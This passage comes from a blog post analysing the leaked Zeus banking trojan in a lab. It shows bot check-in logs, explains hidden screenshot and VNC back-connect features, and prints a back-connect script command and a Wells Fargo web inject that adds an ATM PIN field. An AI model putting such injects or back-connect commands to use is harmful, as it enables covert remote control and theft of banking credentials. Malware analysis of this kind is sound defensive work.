-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:00 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:05 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:10 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:15 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:20 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:23 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:28 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:34 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:39 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:44 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:00:20 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:00:25 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:00:30 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:00:35 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:00:40 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:00:45 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:00:50 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:00:56 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:01:01 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:01:07 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:01:40 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:01:45 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:01:50 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:01:55 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We are also able to, using the control panel, see some more information based on the newly connected bot:</p>
-
-<p><img src="http://i.imgur.com/aKe4kJh.png"></p>
-
-<p>An interesting thing to note here. It appears that the Zeus bot opens up a socks port on the client machines. If the Command &amp; Control server is able to connect to this IP, and the socks port, then it will be able to pull a screenshot of the current state the client pc is in. This is an <em>almost live</em> image. On the client, we can see that the process <code>explorer.exe</code> is listening in port 35419. This is the same port that the web interface is reporting as the SOCKS port.</p>
-
-<p><img src="http://i.imgur.com/fiy0u2N.png"></p>
-
-<p>In the case of my lab setup, this SOCKS connection was not possible due to the fact that the client is reporting as connected from 172.16.50.2, which is the fake, natted public ip of the lab firewall. The firewall itself is most certainly not listening on that port so the connection would fail. Maybe if I port forwarded the connection back into the fake LAN it would have been able to connect but this I did not test.</p>
-
-<p>So, to test the screen-shotting features, I infected another client on the fake Internet, where the Command &amp; Control server <strong>will</strong> be able to connect to. The result?</p>
-
-<p><img src="http://i.imgur.com/GMqlVCM.png"></p>
-
-<p>There is <strong>no</strong> visual sign of this activity to the user. The user may be busy with some highly confidential work on hes workstation, unaware that an intruder is able to see what he is seeing. You know, like using that secret text file with all your passwords in it.</p>
-
-<h4>But thats not all</h4>
-
-<p>Just being able to <em>see</em> what the user sees is not really enough. No. You also have the ability to remotely VNC into the infected machine. By doing this, the attacker is able to remotely control your computer as you, with one difference, you won&rsquo;t know about it. So lets say he managed to successfully compromise your banking credentials. Instead of triggering alarms on the banks side that a login has just occurred on the other side of the globe, the attacker can now use <strong>your</strong> machine to steal <strong>your</strong> money. From the banks perspective this may appear like a perfectly legitimate transaction.</p>
-
-<p>So lets see how this VNC functionality works.</p>
-
-<h4>Execute the VNC BC Script</h4>
-
-<p>First, the attacker will have to prepare a back connect server and then, via a script, tell the bot to connect to this server so that he may access the botted machine. This architecture is pretty solid. The only thing really that would stop an attacker from succeeding in setting up this back connect is if the remote firewall was to block the port that the attacker has set up on the back connect server. However, things like port 80, or even 443 is almost always opened, so these will be prime candidates to use.</p>
-
-<p>In short, the setup will look something like this.</p>
-
-<figure class='code'><figcaption><span>Back Connect Server</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>   --------------------------&gt;        &lt;--------------------------------------------
-</span><span class='line'>   --------------------------&gt;        &lt;--------------------------------------------
-</span><span class='line'>
-</span><span class='line'>   +------------+      +-----------------------+  +--------------+   +------------------+
-</span><span class='line'>   <span class="p">|</span>  Attacker  +------&gt;  Back Connect Server  &lt;--+ LAN Firewall &lt;---+ Infected Machine <span class="p">|</span>
-</span><span class='line'>   +------------+      +-----------------------+  +--------------+   +------------------+
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The back connect server could be any host the attacker has access to and controls. This is also a great way for the attacker that wants to VNC to hide hes IP information. Should you on the infected machine realize what is going on, then you&rsquo;d only see the connection going out to the back connect server, and not the real attacker. The server executable is <code>zsbcs.exe</code> in the <code>output/server/</code> directory and is a windows only tool.</p>
-
-<p>Once the Back Connect Server is setup to listen on one port for new bots, and another for VNC client connections, the attacker would configure a script, instructing the clients where to connect. The script would look something like this:</p>
-
-<figure class='code'><figcaption><span>Back Connect Script</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>bot_bc_add vnc 172.16.50.181 9000
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This tells the bot where to connect to wait for a VNC session.</p>
-
-<p>Next, the attacker can sit and watch hes Back Connect Server&rsquo;s output and see when a new bot has connected. He may now connect using hes VNC client to the client port of the back connect server and viola, VNC access. Alarmingly, the VNC access is not like your traditional VNC where the user will see the pointer move as the VNC user moves it. No, this VNC session starts in a separate <strong>display</strong>, ensuring that the user is still unaware of what is happening. This for me was the most alarming part. It&rsquo;s almost as if hes attaching to another <em>tty</em>.</p>
-
-<p><img src="http://i.imgur.com/7tg4l2X.png"></p>
-
-<h3>Web Injects, the real threat.</h3>
-
-<p>So all of this Remote Administration Stuff is cool. No doubt they are useful tools for an attacker, but this is not what has made Zeus what it is known for today. Zeus uses what is called <strong>Web Injects</strong> to manipulate website content. &ldquo;What do you mean by &lsquo;manipulation&rsquo;?&rdquo; you may ask. Well, lets assume you are about to buy something online. Generally, the store would ask you for a Credit Card number and an expiry. Usually, on the next page you may be asked for the CVV number. With your machine infected with Zeus, the attacker is able to ask for your Credit Card Number, Expiry, CVV, Email Address, Address, Tel no., secret question etc etc all on one page. The page itself will look totally legit, and again, to the unsuspecting user, this may seem completely normal and away he goes entering hes details. Once submitted, Zeus captures the entire request, including the cookies, the POST data etc etc and based on the bots timer configurations, uploads this information to the Command &amp; Control server. Just like the one we just used to Remotely Administer the infected machines.</p>
-
-<p>With all this information, he may be able to return at a later stage, VNC to your computer and access your account to buy himself some new toys. Because he managed to get hold of your secret question, he finds no trouble in complying to any potential security checks the portal may bring.</p>
-
-<h4>How it works</h4>
-
-<p>When looking at the web injects, I guess the simplest way to describe them is similar to your favorite text editors search and replace features. With the Zeus bot hooked into some low level network API&rsquo;s in Windows, it is able to monitor for its configured URL&rsquo;s, and inject arbitrary content into the responses that are displayed in your browser. Lets take an example from the source <a href="https://github.com/Visgean/Zeus/blob/translation/output/builder/webinjects.txt#L63">here</a>.</p>
-
-<figure class='code'><figcaption><span>Wellsfargo Web Inject</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'>set_url https://www.wellsfargo.com/* G
-</span><span class='line'>data_before
-</span><span class='line'><span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">&quot;mozcloak&quot;</span><span class="nt">&gt;&lt;input</span> <span class="na">type=</span><span class="s">&quot;password&quot;</span><span class="err">*&lt;/</span><span class="na">span</span><span class="nt">&gt;</span>
-</span><span class='line'>data_end
-</span><span class='line'>data_inject
-</span><span class='line'><span class="nt">&lt;br&gt;&lt;strong&gt;&lt;label</span> <span class="na">for=</span><span class="s">&quot;atmpin&quot;</span><span class="nt">&gt;</span>ATM PIN<span class="nt">&lt;/label&gt;</span>:<span class="nt">&lt;/strong&gt;</span><span class="ni">&amp;nbsp;</span><span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
-</span><span class='line'><span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">&quot;mozcloak&quot;</span><span class="nt">&gt;&lt;input</span> <span class="na">type=</span><span class="s">&quot;password&quot;</span> <span class="na">accesskey=</span><span class="s">&quot;A&quot;</span> <span class="na">id=</span><span class="s">&quot;atmpin&quot;</span> <span class="na">name=</span><span class="s">&quot;USpass&quot;</span> <span class="na">size=</span><span class="s">&quot;13&quot;</span> <span class="na">maxlength=</span><span class="s">&quot;14&quot;</span> <span class="na">style=</span><span class="s">&quot;width:147px&quot;</span> <span class="na">tabindex=</span><span class="s">&quot;2&quot;</span> <span class="nt">/&gt;&lt;/span&gt;</span>
-</span><span class='line'>data_end
-</span><span class='line'>data_after
-</span><span class='line'>data_end
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>In the above extract from the web injects we can see that the http<strong>s</strong>://wellsfargo.com (note the s) website will have a extra field added, asking for a <em>ATM PIN</em> before the password field. Now, an important thing to note here. Yes, a website owner could change the web sources which will make this web inject not work, however, the POST data will still be recorded for this watched URL and eventually stored on the C&amp;C.</p>
-
-<p><img src="http://npercoco.typepad.com/.a/6a0133f264aa62970b01910426b229970c-pi"></p>
-
-<h3>Summary</h3>
-
-<p>While Zeus itself is old news and many variants such as <a href="http://www.mcafee.com/us/resources/white-papers/wp-citadel-trojan.pdf">Citadel</a> have sprung up, I believe this is still a very valid threat as the concepts remain the same.</p>
-
-<p>A interesting thing about the bot. Zeus, once it infects a PC, will delete all the cookies in Internet Explorer. This is to force the user to re-login to the services he uses, and also lets Zeus grab them :)</p>
 ]]></content>
   </entry>
   
